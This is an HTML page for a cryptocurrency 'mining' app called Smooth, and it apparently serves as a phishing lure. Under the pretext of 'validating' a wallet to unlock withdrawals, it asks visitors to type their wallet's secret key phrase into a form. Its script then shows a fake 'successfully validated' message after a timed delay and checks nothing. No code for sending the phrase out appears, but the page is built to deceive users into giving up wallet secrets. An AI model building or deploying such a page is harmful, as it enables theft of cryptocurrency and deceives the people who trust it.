<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Smooth | Validate Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-950 text-white min-h-screen pb-20 font-sans">

    <!-- Top Navigation Header -->
    <div class="p-4 bg-gray-900 border-b border-gray-800 flex justify-between items-center">
        <a href="index.html" class="text-xl font-bold text-yellow-500">Smooth App</a>
        <span class="text-xs text-gray-400 bg-gray-800 px-3 py-1.5 rounded-lg border border-gray-700">BEP20 BSC</span>
    </div>

    <!-- Main Validation Form -->
    <div class="max-w-md mx-auto p-4 space-y-6 mt-4">
        
        <div class="text-center space-y-2">
            <h2 class="text-2xl font-bold text-yellow-400">Validate Your Wallet</h2>
            <p class="text-xs text-gray-400">Synchronize or verify your node key on the Binance Smart Chain to enable withdrawal features.</p>
        </div>

        <!-- Validation Form Card -->
        <div class="bg-gray-900 border border-gray-800 rounded-2xl p-6 shadow-xl space-y-4">
            
            <div>
                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Select Wallet</label>
                <select id="walletType" class="w-full bg-gray-950 border border-gray-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-yellow-500">
                    <option value="metamask">MetaMask</option>
                    <option value="trustwallet">Trust Wallet</option>
                    <option value="binance">Binance Web3 Wallet</option>
                    <option value="other">Other WalletConnect Supported</option>
                </select>
            </div>

            <div>
                <label class="block text-xs font-semibold text-gray-400 uppercase tracking-wider mb-2">Wallet Address or Passphrase Key</label>
                <textarea id="walletInput" rows="3" placeholder="Enter 0x... BEP20 address or secret key phrase" class="w-full bg-gray-950 border border-gray-700 rounded-xl p-3 text-sm text-white focus:outline-none focus:border-yellow-500 resize-none"></textarea>
            </div>

            <button id="validateBtn" onclick="handleValidation()" class="w-full bg-yellow-500 hover:bg-yellow-400 text-gray-950 font-black py-3 rounded-xl text-md shadow-lg transition active:scale-95">
                Validate Wallet Connection ↗
            </button>

            <!-- Status Output Message -->
            <div id="statusMessage" class="hidden text-center text-xs p-3 rounded-lg border"></div>
        </div>

        <!-- Quick Routing Links -->
        <div class="grid grid-cols-2 gap-2 bg-gray-900 p-1 rounded-xl border border-gray-800">
            <a href="index.html" class="text-center py-2 text-sm text-gray-400 hover:text-white">Home Page</a>
            <a href="mine.html" class="text-center py-2 text-sm text-yellow-500 font-bold hover:text-yellow-400">Mining Dashboard</a>
        </div>

    </div>

    <!-- Bottom Navigation Bar -->
    <nav class="fixed bottom-0 left-0 right-0 bg-gray-900 border-t border-gray-800 py-3 flex justify-around text-xl">
        <a href="index.html" class="hover:opacity-100 opacity-60">🏠</a>
        <a href="mine.html" class="hover:opacity-100 opacity-60">⛏️</a>
        <a href="validate.html" class="opacity-100 border-b-2 border-yellow-500 pb-1">🏪</a>
        <a href="validate.html" class="hover:opacity-100 opacity-60">⚙️</a>
    </nav>

    <script>
        function handleValidation() {
            const input = document.getElementById('walletInput').value.trim();
            const status = document.getElementById('statusMessage');
            const btn = document.getElementById('validateBtn');

            if (!input) {
                status.className = "text-center text-xs p-3 rounded-lg border border-red-800 bg-red-950/50 text-red-400 block";
                status.innerText = "Please enter a valid BEP20 address or node phrase.";
                return;
            }

            btn.disabled = true;
            btn.innerText = "Validating on BSC...";
            btn.classList.add("opacity-50");

            setTimeout(() => {
                btn.disabled = false;
                btn.innerText = "Validate Wallet Connection ↗";
                btn.classList.remove("opacity-50");
                
                status.className = "text-center text-xs p-3 rounded-lg border border-emerald-800 bg-emerald-950/50 text-emerald-400 block";
                status.innerText = "Wallet successfully validated on BEP20 network!";
            }, 1500);
        }
    </script>
</body>
</html>
